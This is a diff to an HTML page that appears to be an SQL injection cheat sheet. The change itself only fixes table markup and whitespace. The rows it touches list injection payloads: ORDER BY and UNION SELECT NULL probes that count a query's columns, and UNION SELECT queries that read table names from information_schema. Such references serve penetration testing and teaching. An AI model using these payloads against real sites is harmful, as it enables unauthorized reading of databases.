@@ -499,34 +499,36 @@ layout: default
         <tr>
             <td>Enumerate # of columns</td>
             <td>
-                <tr>
-                    <td></td>
-                    <td>Method 1</td>
-                    <td>Method 2</td>
-                    <td>Method 3</td>
-                    <td>Method 4</td>
-                </tr>
-                <tr>
-                    <td>Enumerate column 1</td>
-                    <td>1 order by 1</td>
-                    <td>' order by 1-- -</td>
-                    <td>' UNION SELECT NULL--</td>
-                    <td>&lt;Legit Search&gt;' order by 1-- -</td>
-                </tr>
-                <tr>
-                    <td>Enumerate column 2</td>
-                    <td>1 order by 2 </td>
-                    <td>' order by 2-- -</td>
-                    <td>' UNION SELECT NULL,NULL--</td>
-                    <td>>&lt;Legit Search&gt;' order by 1,2-- -</td>
-                </tr>
-                <tr>
-                    <td></td>
-                    <td>Continue until error</td>
-                    <td>Continue until error</td>
-                    <td>Continue until no error</td>
-                    <td>Continue until no results</td>
-                </tr>
+                <table>
+                    <tr>
+                        <td></td>
+                        <td>Method 1</td>
+                        <td>Method 2</td>
+                        <td>Method 3</td>
+                        <td>Method 4</td>
+                    </tr>
+                    <tr>
+                        <td>Enumerate column 1</td>
+                        <td>1 order by 1</td>
+                        <td>' order by 1-- -</td>
+                        <td>' UNION SELECT NULL--</td>
+                        <td>&lt;Legit Search&gt;' order by 1-- -</td>
+                    </tr>
+                    <tr>
+                        <td>Enumerate column 2</td>
+                        <td>1 order by 2 </td>
+                        <td>' order by 2-- -</td>
+                        <td>' UNION SELECT NULL,NULL--</td>
+                        <td>>&lt;Legit Search&gt;' order by 1,2-- -</td>
+                    </tr>
+                    <tr>
+                        <td></td>
+                        <td>Continue until error</td>
+                        <td>Continue until error</td>
+                        <td>Continue until no error</td>
+                        <td>Continue until no results</td>
+                    </tr>
+                </table>   
             </td>
         </tr>
         <tr>
@@ -546,11 +548,11 @@ layout: default
                             <table>
                                 <tr>
                                     <td>Method #1</td>
-                                    <td>1 and 1=2 UNION SELECT  1,2,3,table_name from information_schema.tables--</td>
+                                    <td>1 and 1=2 UNION SELECT 1,2,3,table_name from information_schema.tables--</td>
                                 </tr>
                                 <tr>
                                     <td>Method #2</td>
-                                    <td> ' UNION SELECT  table_name,2 from information_schema.tables--</td>
+                                    <td>' UNION SELECT table_name,2 from information_schema.tables--</td>
                                 </tr>
                             </table>
                         </td>
